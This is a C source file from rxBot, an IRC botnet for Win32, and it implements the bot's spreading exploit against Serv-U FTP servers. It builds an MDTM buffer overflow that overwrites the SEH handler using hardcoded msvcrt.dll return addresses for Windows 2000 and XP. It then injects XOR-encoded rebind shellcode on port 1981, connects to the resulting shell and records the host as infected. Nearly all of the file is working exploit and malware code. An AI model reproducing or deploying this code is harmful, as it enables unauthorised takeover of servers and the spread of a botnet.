/*

    rxBot - a modular IRC bot for Win32
    Copyright (C) 2004

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/

#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_FTPDS

#define USER			"ftp"
#define PASS			"ftp@ftp.com"

struct
{
	DWORD	dwJMP;
	char	*szDescription;
} servu[] =
{
	{0x7801D07B,"Serv-U 3.x/4.x/5.x  ALL   2K         SP3/SP4"},	//msvcrt.dll pop,pop,ret addr
//	{0x78010394,"Serv-U 3.x/4.x/5.x  ALL   2K         SP4"},		//msvcrt.dll pop,pop,ret addr
	{0x77c22ca7,"Serv-U 3.x/4.x/5.x  ALL   XP         SP1"},		//msvcrt.dll pop,pop,ret addr 
},v;

#define MAX_LEN			2048
#define	SEH_OFFSET 		48-1
#define JMP_OVER		"\xeb\x06\xeb\x06"
#define BIND_OFFSET		113

// 31 bytes decode by lion for overwrite SEH, don't change this.
unsigned char decode2[]=
	"\x5E\x5F\x5B\xBE\x6D\x69\x6F\x6E\x4E\xBF\x6D\x69\x30\x6E\x4F\x43"
	"\x39\x3B\x75\xFB\x4B\x80\x33\x99\x39\x73\xFC\x75\xF7\xFF\xD3";

// Shellcode start sign, use for decode, don't change this.
unsigned char sc_start[]= "lion"; 

// Shellcode end sign, use for decode, don't change this.
unsigned char sc_end[]= "li0n"; 

// 344 bytes rebind shellcode by lion for Serv-U (xor with 0x99)
unsigned char sc[]=
	"\x70\xBB\x98\x99\x99\xC6\xFD\x38\xA9\x99\x99\x99\x12\xD9\x95\x12"
	"\xE9\x85\x34\x12\xF1\x91\x12\x6E\xF3\x9D\xC0\x71\x5B\x99\x99\x99"
	"\x7B\x60\xF1\xAA\xAB\x99\x99\xF1\xEE\xEA\xAB\xC6\xCD\x66\x8F\x12"
	"\x71\xF3\x9E\xC0\x71\x30\x99\x99\x99\x7B\x60\x18\x75\x09\x98\x99"
	"\x99\xCD\xF1\x98\x98\x99\x99\x66\xCF\x89\xC9\xC9\xC9\xC9\xF3\x98"
	"\xF3\x9B\x66\xCF\x8D\x12\x41\x5E\x9E\x98\x99\x99\x99\xF3\x9D\x14"
	"\x8E\xCB\xF3\x9D\xF1\x66\x66\x99\x99\xCA\x66\xCF\x81\x5E\x9E\x9B"
	"\x99\x99\xAC\x10\xDE\x9D\xF3\x89\xCE\xCA\x66\xCF\x85\xF3\x98\xCA"
	"\x66\xCF\xB9\xC9\xC9\xCA\x66\xCF\xBD\x12\x41\xAA\x59\xF1\xFA\xF4"
	"\xFD\x99\x10\xFF\xA9\x1A\x75\xCD\x12\x65\xF3\x8D\xC0\x10\x9D\x16"
	"\x7B\x62\x5F\xDE\x89\xDD\x67\xDE\xA5\x67\xDE\xA4\x10\xC6\xD1\x10"
	"\xC6\xD5\x10\xC6\xC9\x14\xDD\xBD\x89\xCE\xC9\xC8\xC8\xC8\xF3\x98"
	"\xC8\xC8\x66\xEF\xA9\xC8\x66\xCF\x9D\x12\x55\xF3\x66\x66\xA8\x66"
	"\xCF\x91\x72\x9E\x09\x09\x09\x09\x09\x09\x09\xCA\x66\xCF\xB1\x66"
	"\xCF\x95\xC8\xCF\x12\xEC\xA5\x12\xED\xB7\xE1\x9A\x6C\xCF\x12\xEF"
	"\xB9\x9A\x6C\xAA\x50\xD0\xD8\x34\x9A\x5C\xAA\x42\x96\x27\x89\xA3"
	"\x4F\xED\x91\x58\x52\x94\x9A\x43\xD9\x72\x68\xA2\x86\xEC\x7E\xC7"
	"\x12\xC7\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC7\x85\x9A\x44\x12\x9D"
	"\x12\x9A\x5C\x32\xC7\xC0\x5A\x71\x40\x67\x66\x66\x17\xD7\x97\x75"
	"\xEB\x67\x2A\x8F\x34\x40\x9C\x57\xE7\x41\x7B\xEA\x52\x74\x65\xA2"
	"\x40\x90\x6C\x34\x75\x6B\xCC\x59\x3D\x83\xE9\x5E\x3D\x34\xB7\x70"
	"\x7C\xD0\x1F\xD0\x7E\xE0\x5F\xE0";

bool servuftpd(EXINFO exinfo) {
	int iHostFTP=AdvFTPdScannerCheckHead(exinfo);
	if (iHostFTP==FTP_TYPE_SERVU || iHostFTP==FTP_TYPE_SERVU_2X || iHostFTP==FTP_TYPE_UNKNOWN) return false;

	int iType=0;
	if (FpHost(exinfo.ip, FP_PORT5K)==OS_WINXP) iType=1;

	char user[128], pass[128], szRecvBuff[MAX_LEN];
	unsigned char szCommand[MAX_LEN];
	unsigned short shport=1981;
	int i;

	_snprintf(user, sizeof(user)-1, "USER %s\r\n", USER); user[sizeof(user)-1]='\0';
	_snprintf(pass, sizeof(pass)-1, "PASS %s\r\n", PASS); pass[sizeof(pass)-1]='\0';

	// fill the "MDTM" command
	strcpy((char*)szCommand, "MDTM 20031111111111+");


	// fill the egg
	memset(szCommand, 0x90, SEH_OFFSET);

	// fill the seh
	for(i=0; i<0x10*1; i+=8) {
		memcpy(&szCommand[strlen((const char*)szCommand)], &JMP_OVER, 4);
		memcpy(&szCommand[strlen((const char*)szCommand)], &servu[iType].dwJMP, 4);
	}

	// fill the decode
	strcat((char*)szCommand, (const char*)decode2);

	// fill the space
	strcat((char*)szCommand, " ");

	// fill the egg
	memset(szCommand, 0x90, 10);

	// fill the shellcode start sign
	strcat((char*)szCommand, (const char*)sc_start);

	// rebind shellcode
	unsigned short shport2 = fhtons(shport)^(unsigned short)0x9999;
	memcpy(&sc[BIND_OFFSET], &shport2, 2);
	strcat((char*)szCommand, (const char*)sc);

	// fill the shellcode end sign
	strcat((char*)szCommand, (const char*)sc_end);

	// send end
	strcat((char*)szCommand, "\r\n");

	SOCKET s;
	if((s = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET) return false;

	SOCKADDR_IN ssin;
	ssin.sin_family = AF_INET;
	ssin.sin_addr.s_addr = finet_addr(exinfo.ip);
	ssin.sin_port = fhtons((unsigned short)exinfo.port);

	if(fconnect(s, (LPSOCKADDR)&ssin, sizeof(ssin)) == SOCKET_ERROR) return false;

	if(fsend(s, user, strlen(user),0) == SOCKET_ERROR) {
		fclosesocket(s);
		return false;
	}

	if(fsend(s, pass, strlen(pass),0) == SOCKET_ERROR) {
		fclosesocket(s);
		return false;
	}

	if(frecv(s, szRecvBuff, sizeof(szRecvBuff), 0) == SOCKET_ERROR) {
			fclosesocket(s);
			return false;
	} else if(szRecvBuff[0] == '5') {
		//printf("[-] Server return a error Message.\r\n");
		fclosesocket(s);
		return false;
	}

	if(fsend(s, (char*)szCommand, strlen((const char*)szCommand),0) == SOCKET_ERROR) {
		fclosesocket(s);
		return false;
	}

	fclosesocket(s);

	Sleep(1000);

	ConnectShell(exinfo, shport);

	return (AddEx(exinfo,true));
}
#endif